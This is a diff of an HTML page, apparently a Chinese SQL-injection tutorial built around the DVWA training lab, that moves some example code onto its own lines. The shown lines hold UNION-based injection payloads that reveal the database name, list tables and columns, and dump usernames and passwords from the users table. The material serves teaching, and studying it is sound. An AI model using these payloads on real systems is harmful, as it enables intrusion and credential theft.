@@ -356,10 +356,12 @@
 <li><p>查看所用库： <code>&#39; union select 1,database()#</code> </p>
 <p><img src="https://i.imgur.com/kR2CYY5.png" alt=""></p>
 </li>
-<li><p>查看该库中的所有表： <code>&#39; union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = &#39;dvwa&#39; #</code></p>
+<li><p>查看该库中的所有表： </p>
+<p><code>&#39; union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = &#39;dvwa&#39; #</code></p>
 <p><img src="https://i.imgur.com/Oo1bHBA.png" alt=""></p>
 </li>
-<li><p>查看users表中有哪些列： <code>&#39; union select 1,COLUMN_NAME from information_schema.COLUMNS where  TABLE_SCHEMA = &#39;dvwa&#39; and TABLE_NAME = &#39;users&#39; #</code></p>
+<li><p>查看users表中有哪些列： </p>
+<p><code>&#39; union select 1,COLUMN_NAME from information_schema.COLUMNS where  TABLE_SCHEMA = &#39;dvwa&#39; and TABLE_NAME = &#39;users&#39; #</code></p>
 <p><img src="https://i.imgur.com/5QwxXg7.png" alt=""></p>
 </li>
 <li><p>dump:    <code>&#39; union select 1,concat_ws(&#39; - &#39;,user_id,first_name,last_name,user,password) from users #</code></p>
